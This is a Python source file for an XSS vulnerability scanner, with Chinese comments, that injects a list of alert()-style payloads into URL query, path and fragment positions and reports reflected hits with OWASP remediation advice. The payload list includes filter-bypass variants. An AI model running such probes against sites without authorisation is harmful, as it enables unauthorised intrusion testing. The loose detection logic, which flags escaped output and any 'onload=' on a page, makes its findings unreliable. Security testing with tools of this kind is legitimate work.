# ✅ 改进版 XSSScanner with dashboard 支持和增强注入点检测

import requests
from colorama import Fore, init
from urllib.parse import urlparse, parse_qs, urlencode, quote
import re
import html
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


class XSSScanner:
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "\" onmouseover=alert(1) \"",
        "';alert(1)//",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<body onload=alert('XSS')>",
        "javascript:eval('alert(1)')",
    ]

    def __init__(self, timeout=30, use_headless=True, dashboard=None):
        self.timeout = timeout
        self.use_headless = use_headless
        self.dashboard = dashboard
        self.task_id = None
        init(autoreset=True)
        self.xss_pattern = re.compile(
            r"(<script.*?>.*?</script>|onerror=|onload=|javascript:|alert\()", re.IGNORECASE
        )

    def set_dashboard(self, dashboard):
        self.dashboard = dashboard

    def send_request(self, url, method="GET", data=None):
        headers = {"User-Agent": "Mozilla/5.0"}
        if self.use_headless:
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--disable-gpu")
            options.add_argument("--log-level=3")
            driver = webdriver.Chrome(options=options)
            try:
                if method == "GET":
                    driver.get(url)
                else:
                    form_html = f"""
                    <form id='f' action='{url}' method='post'>
                    {''.join([f'<input type=hidden name="{k}" value="{v}">' for k, v in data.items()])}
                    </form>
                    <script>document.getElementById('f').submit();</script>
                    """
                    driver.get("data:text/html;charset=utf-8," + quote(form_html))
                return driver.page_source
            finally:
                driver.quit()
        else:
            if method == "POST" and data:
                return requests.post(url, data=data, timeout=self.timeout).text
            return requests.get(url, timeout=self.timeout).text

    def get_injection_points(self, url):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        points = [{'type': 'query', 'name': k} for k in query] if query else [{'type': 'query', 'name': 'x'}]
        if parsed.path.strip('/'):
            points.append({'type': 'path', 'name': 'path'})
        if parsed.fragment:
            points.append({'type': 'fragment', 'name': 'fragment'})
        return points

    def build_test_url(self, parsed, point, payload):
        if point['type'] == 'query':
            q = parse_qs(parsed.query)
            q[point['name']] = [payload]
            return parsed._replace(query=urlencode(q, doseq=True)).geturl()
        elif point['type'] == 'path':
            new_path = parsed.path.rstrip('/') + '/' + payload
            return parsed._replace(path=new_path).geturl()
        elif point['type'] == 'fragment':
            return parsed._replace(fragment=payload).geturl()
        return parsed.geturl()

    def detect_xss(self, response_text, payload):
        escaped_payload = html.escape(payload)
        try:
            if payload.lower() in response_text.lower():
                return True
            if escaped_payload.lower() in response_text.lower():
                return True
            if self.xss_pattern.search(response_text):
                return True

            soup = BeautifulSoup(response_text, 'html.parser')
            for tag in soup.find_all():
                if payload in str(tag):
                    return True
                for attr, val in tag.attrs.items():
                    val_str = ' '.join(val) if isinstance(val, list) else str(val)
                    if payload in val_str:
                        return True
            return False
        except Exception as e:
            print(Fore.YELLOW + f"[XSS检测异常] {e}")
            return False

    def scan(self, url):
        parsed = urlparse(url)
        points = self.get_injection_points(url)
        total_tests = len(points) * len(self.PAYLOADS)
        if self.dashboard:
            self.task_id = self.dashboard.add_task("XSS漏洞扫描", total=total_tests)

        results = []
        for point in points:
            for payload in self.PAYLOADS:
                test_url = self.build_test_url(parsed, point, payload)
                try:
                    response_text = self.send_request(test_url)
                    if self.detect_xss(response_text, payload):
                        print(Fore.RED + f"[!] XSS漏洞发现于 {point['type']} 参数 {point['name']}")
                        results.append({
                            'type': 'XSS',
                            'param_type': point['type'],
                            'param_name': point['name'],
                            'payload': payload,
                            'severity': 'high',
                            'description': "存在XSS注入风险，恶意脚本可能被执行",
                            'solutions': [
                                "使用HTML编码过滤用户输入",
                                "开启Content-Security-Policy (CSP)",
                                "避免直接输出用户输入到HTML中"
                            ],
                            'references': [
                                "https://owasp.org/www-community/attacks/xss/",
                                "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html"
                            ],
                            'url': test_url
                        })
                except Exception as e:
                    print(Fore.YELLOW + f"[跳过] {point['name']} - {e}")
                if self.dashboard:
                    self.dashboard.update(self.task_id, advance=1)

        if self.dashboard:
            self.dashboard.update(self.task_id, advance=0, completed=True)

        return results




